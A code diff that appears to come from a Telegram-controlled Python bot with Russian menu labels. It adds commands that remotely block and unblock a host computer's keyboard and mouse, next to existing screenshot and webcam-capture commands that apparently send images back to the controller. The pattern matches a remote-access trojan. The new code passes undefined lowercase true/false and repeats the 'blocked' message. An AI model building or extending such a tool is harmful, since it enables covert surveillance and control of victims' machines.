@@ -11,6 +11,7 @@ from Funcs.state import return_message
 from message_processing import fun_messages as fs
 from Funcs import fun_commands
 
+
 storage = MemoryStorage()
 
 
@@ -39,6 +40,16 @@ async def fun_command(message: types.Message, state: FSMContext):
         await bot.send_photo(identify, photo)
         os.remove(f'{funcs.PATH}ss.png')
         await bot.send_message(identify, return_message("Скриншот готов\n"))
+        await state.finish()
+    
+    elif data['choosen'] == "Блок мышки и клавы":
+        fun_commands.Fun_funcs.blockUnblockKeyMouse(true)
+        await bot.send_message(identify, return_message("Заблокировано\n"))
+        await state.finish()
+    
+    elif data['choosen'] == "Анблок мышки и клавы":
+        fun_commands.Fun_funcs.blockUnblockKeyMouse(false)
+        await bot.send_message(identify, return_message("Заблокировано\n"))
         await state.finish()
     
     elif data['choosen'] == "Фото с камеры":
